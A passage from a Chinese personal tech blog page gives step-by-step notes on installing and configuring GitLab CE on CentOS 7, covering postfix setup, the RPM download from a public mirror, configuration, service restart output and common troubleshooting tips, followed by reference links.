<span class="string">'systemctl status postfix.service'</span> and <span class="string">'journalctl -xn'</span> <span class="keyword">for</span> deta。</span><br><span class="line"></span><br><span class="line">然后执行vi /etc/hosts，注释掉下面这一行</span><br><span class="line"></span><br><span class="line">#::1  localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">systemctl start postfix</span><br></pre></td></tr></table></figure>
<h3 id="添加GitLab镜像"><a href="#添加GitLab镜像" class="headerlink" title="添加GitLab镜像"></a>添加GitLab镜像</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-10.0.0-ce.0.el7.x86_64.rpm</span></span><br><span class="line">rpm -i gitlab-ce<span class="number">-10.0</span><span class="number">.0</span>-ce<span class="number">.0</span>.el7.x86_64.rpm</span><br><span class="line">#rpm -e gitlab-ce-10.0.0-ce.0.el7.x86_64 卸载</span><br><span class="line">出现错误：依赖检测失败。</span><br><span class="line">yum install policycoreutils-python</span><br></pre></td></tr></table></figure>
<h3 id="修改gitlab配置"><a href="#修改gitlab配置" class="headerlink" title="修改gitlab配置"></a>修改gitlab配置</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim  /etc/gitlab/gitlab.rb</span><br><span class="line"></span><br><span class="line">修改external_url <span class="string">'http://xxxx'</span>（xxx：代表公网IP地址）</span><br></pre></td></tr></table></figure>
<h3 id="启动GitLab"><a href="#启动GitLab" class="headerlink" title="启动GitLab"></a>启动GitLab</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gitlab-ctl reconfigure</span><br><span class="line">gitlab-ctl restart</span><br><span class="line">ok: run: alertmanager: (pid <span class="number">3845</span>) <span class="number">0</span>s</span><br><span class="line">ok: run: gitaly: (pid <span class="number">3854</span>) <span class="number">0</span>s</span><br><span class="line">ok: run: gitlab-monitor: (pid <span class="number">3866</span>) <span class="number">0</span>s</span><br><span class="line">ok: run: gitlab-workhorse: (pid <span class="number">3873</span>) <span class="number">1</span>s</span><br><span class="line">ok: run: logrotate: (pid <span class="number">3878</span>) <span class="number">0</span>s</span><br><span class="line">ok: run: nginx: (pid <span class="number">3889</span>) <span class="number">0</span>s</span><br><span class="line">ok: run: node-exporter: (pid <span class="number">3891</span>) <span class="number">0</span>s</span><br><span class="line">ok: run: postgres-exporter: (pid <span class="number">3903</span>) <span class="number">0</span>s</span><br><span class="line">ok: run: postgresql: (pid <span class="number">3976</span>) <span class="number">1</span>s</span><br><span class="line">ok: run: prometheus: (pid <span class="number">4000</span>) <span class="number">0</span>s</span><br><span class="line">ok: run: redis: (pid <span class="number">4008</span>) <span class="number">0</span>s</span><br><span class="line">ok: run: redis-exporter: (pid <span class="number">4013</span>) <span class="number">0</span>s</span><br><span class="line">ok: run: sidekiq: (pid <span class="number">4025</span>) <span class="number">0</span>s</span><br><span class="line">ok: run: unicorn: (pid <span class="number">4033</span>) <span class="number">1</span>s</span><br><span class="line">直接输入服务器ip和指定端口进行访问</span><br><span class="line">初始账户:root 密码:第一次登录修改密码</span><br></pre></td></tr></table></figure>
<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">排查问题利器：</span><br><span class="line">gitlab-rake gitlab:check ( check查看整体状态值)</span><br><span class="line">gitlab-ctl status  (查询gitlab状态)</span><br><span class="line"> </span><br><span class="line">如果缺少资源，可以使用以下命令关闭Unicorn和Sidekiq，暂时释放一些内存：</span><br><span class="line">sudo gitlab-ctl stop unicorn</span><br><span class="line">sudo gitlab-ctl stop sidekiq</span><br><span class="line"><span class="number">8080</span>端口冲突</span><br><span class="line">原因：由于unicorn默认使用的是<span class="number">8080</span>端口。</span><br><span class="line">解决办法：打开/etc/gitlab/gitlab.rb,打开# unicorn['port'] = 8080 的注释，将8080修改为9090，保存后运行sudo gitlab-ctl reconfigure即可。</span><br></pre></td></tr></table></figure>
<p><a href="https://mp.weixin.qq.com/s/iLENqV4mULSpeX0JRdgOWQ" target="_blank" rel="noopener">5分钟教你搭建一个GitLab仓库</a></p>
<p><a href="http://www.54php.cn/default/96.html" target="_blank" rel="noopener">用GitLab搭建自己的私有GitHub</a></p>
<p><a href="https://www.cnblogs.com/qiuzhimutou/p/9769940.html" target="_blank" rel="noopener">搭建GitLab</a></p>
<p><a href="https://www.fanhaobai.com/2017/02/gitlab-install.html" target="_blank" rel="noopener">搭建本地GitLab仓库</a></p>
<p><a href="https://www.restran.net/2016/02/23/git-and-gitlab-guide/" target="_blank" rel="noopener">Git &amp; Gitlab 使用指南</a></p>
<p><a href="https://learngitbranching.js.org/?demo" target="_blank" rel="noopener">git在线测试</a></p>
<p><a href="https://learnku.com/articles/29715" target="_blank" rel="noopener">Jenkins CentOS 安装</a></p>
<p><a href="https://www.codeku.me/archives/3031.html" target="_blank" rel="noopener">自建GitHub镜像，速度提升百分之一千https://i.codeku.me</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/25/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/25/">25</a><span class="page-number current">26</span><a class="page-number" href="/page/27/">27</a><span class="space">&hellip;</span><a class="page-number" href="/page/29/">29</a><a class="extend next" rel="next" href="/page/27/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">苏生不惑</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">284</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">37</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/sushengbuhuo" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mysusheng@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://plus.google.com/mysusheng" target="_blank" title="Google">
                      
                        <i class="fa fa-fw fa-google"></i>Google</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://v2ex.com/" title="v2ex" target="_blank">v2ex</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.fanhaobai.com/" title="fanhaobai" target="_blank">fanhaobai</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://yuanxuxu.com/archives/" title="yuanxuxu" target="_blank">yuanxuxu</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.snail-c.cn/article" title="snail-c" target="_blank">snail-c</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://showcj.com/archives" title="showcj" target="_blank">showcj</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://vultr.aicnm.com/%E6%9C%80%E6%96%B0Vultr%E6%B3%A8%E5%86%8C%E5%8F%8AVPS%E8%B4%AD%E4%B9%B0%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B/" title="vultr" target="_blank">vultr</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.lucissfer.com/" title="lucissfer" target="_blank">lucissfer</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.csdn.net/fdipzone/article/details/79352685" title="傲雪星枫" target="_blank">傲雪星枫</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.yoby123.cn/index.php/category/default/" title="小白的分享" target="_blank">小白的分享</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.cnblogs.com/52fhy/p/5819995.html" title="PHP攻城狮" target="_blank">PHP攻城狮</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.jiaojie.site/" title="php" target="_blank">php</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sphard.com/archives/" title="sphard" target="_blank">sphard</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://yuanxuxu.com/archives/" title="LNMP技术栈笔记" target="_blank">LNMP技术栈笔记</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.coding10.com/" title="学习 Laravel" target="_blank">学习 Laravel</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://shuwoom.com/?page_id=929" title="区块链学习指南" target="_blank">区块链学习指南</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://greenlightt.github.io/archives/" title="greenlightt" target="_blank">greenlightt</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.0php.net/archives/" title="0php" target="_blank">0php</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.fordba.com/category/mysql" title="mysql" target="_blank">mysql</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.itcodemonkey.com/" title="程序员" target="_blank">程序员</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.yanshuo.me/r/v2ex" title="言说" target="_blank">言说</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.timiguo.com/archive.html" title="提米果的博客" target="_blank">提米果的博客</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://phpartisan.cn/news/112.html" title="phpartisan" target="_blank">phpartisan</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.cnblogs.com/52fhy/" title="飞鸿影" target="_blank">飞鸿影</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://www.54php.cn/" title="54php" target="_blank">54php</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.lazyman.vip/" title="营销" target="_blank">营销</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.njphper.com/archives/" title="做人呢最重要的就是开心" target="_blank">做人呢最重要的就是开心</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.h57.pw/" title="php 初心者" target="_blank">php 初心者</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">苏生不惑</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>



<div>
<span id="showDays"></span>

</div>

<span id="busuanzi_container_site_pv">
   总访问量:<span id="busuanzi_value_site_pv"></span>次
</span>



  <span class="post-meta-divider">|</span>



<div class="theme-info">
  <div class="powered-by"></div>
  <span class="post-count">博客全站共682.9k字</span>
</div>
<script>
var birthDay = new Date("11/20/2018");
var now = new Date();
var duration = now.getTime() - birthDay.getTime();
var total= Math.floor(duration / (1000 * 60 * 60 * 24));
document.getElementById("showDays").innerHTML = "本站已运行 "+total+" 天";
</script>

        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人次
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  











<script type="text/javascript">
    (function() {
        // 匿名函数，防止污染全局变量
        var utterances = document.createElement('script');
        utterances.type = 'text/javascript';
        utterances.async = true;
        utterances.setAttribute('issue-term','0')
        utterances.setAttribute('theme','')
        utterances.setAttribute('repo','sushengbuhuo/laravel_ioc_demo')
        utterances.crossorigin = 'anonymous';
        utterances.src = 'https://utteranc.es/client.js';
        // content 是要插入评论的地方
        document.getElementById('gitment-container').appendChild(utterances);
    })();
</script>


  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

  
<script>
  ((window.gitter = {}).chat = {}).options = {
    //room替换成自己的聊天室名称即可，room的名称规则是：username/roomname
    room: 'sushengbuhuo-chat/mychat'
  };
</script>
<script src="https://sidecar.gitter.im/dist/sidecar.v1.js" async defer></script>

</body>
</html>
